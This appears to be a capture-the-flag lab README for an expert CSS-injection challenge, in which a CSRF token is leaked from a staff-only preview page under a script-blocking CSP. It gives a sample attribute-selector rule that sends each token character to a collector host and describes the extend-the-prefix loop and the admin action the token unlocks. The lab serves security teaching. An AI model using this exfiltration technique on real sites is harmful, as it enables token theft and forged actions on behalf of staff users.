# CSS Injection — Exfiltrating a CSRF Token via Attribute Selectors

> Track: `xss` · Difficulty: **expert** · ~50 min · Free hints.

## Scenario

**Stylr** previews newsletters. A contributor supplies a stylesheet
(`POST /styles`), and staff review the result on `/preview`, which renders that
stylesheet via `<link rel="stylesheet" href="/styles.css">`. The preview page's
Content-Security-Policy is **strict on scripts**:

```
default-src 'self'; script-src 'none'; style-src 'self'; img-src *; ...
```

`script-src 'none'` means **no JavaScript runs at all** — not inline, not external.
A classic XSS payload is dead on arrival. But the page still renders **your**
stylesheet, and right next to it sits a CSRF token in an attribute:

```html
<input type="text" name="csrf" value="…the staff CSRF token…" readonly />
```

The admin bot loads `/preview` every second with its staff session. `/preview` is
**staff-only** (403 for you) — so you can never read the token directly; only the
bot renders it.

## Objective

With no JavaScript available, use **CSS** to steal the token. CSS **attribute
selectors** can match on an attribute's value, and a matched rule can fire a
network request via `background-image`:

```css
input[name='csrf'][value^='a'] {
  background: url('http://collector:9000/report?p=0&c=a');
}
```

That rule loads its image **only if** the token starts with `a` — a one-character
oracle. Leak the token **one character at a time** (extend the known prefix each
round), then use it to perform the action it guards:

```
POST /admin/action   {"csrf":"<leaked token>"}      # authorised by the token
POST /solve                                          # → FLAG{…}
```

The collector is on an internal, egress-dropped network; read what it captured via
`GET /oob/received`.

## Getting Started

1. Confirm JavaScript is off the table: read `/preview`'s CSP — `script-src 'none'`.
   A `<script>` or `<img onerror>` cannot run. What CAN the page still load from an
   attacker-controlled source, and what can that thing do besides style text?
2. CSS attribute selectors (`[value^="…"]`, `[value*="…"]`) match on attribute
   values, and `background: url(...)` on a matched, rendered element fires a request.
   How do you turn "the token starts with X" into a network callback?
3. You can only learn one character per stylesheet (you must know the prefix to
   test the next character). So submit a stylesheet, read which character leaked,
   extend your prefix, and submit again — a loop.

**CWE-79 (Injection) + CWE-201 (Insertion of Sensitive Information Into Sent Data).
OWASP A03:2021 – Injection.** The fixes — don't render untrusted stylesheets beside
secrets, keep secrets out of attributes on such pages, rotate the token — are in
`SOLUTION.md`.

## Note on the stack

The catalogued scenario is a Django/PostgreSQL preview page that loads a
user-supplied stylesheet **href**. This lab **re-platforms it to Flask** and hosts
the attacker stylesheet **same-origin** (`POST /styles` → `GET /styles.css`,
`no-store`) so a per-character stylesheet can be swapped in each round; the CSP is
`style-src 'self'`. The taught primitive — CSS attribute-selector exfil of an
attribute-borne secret under a script-blocking CSP — is identical. The token is
shortened to 8 hex characters so the character-by-character leak fits the CI
exploit budget. See `SOLUTION.md` for the deviation note.
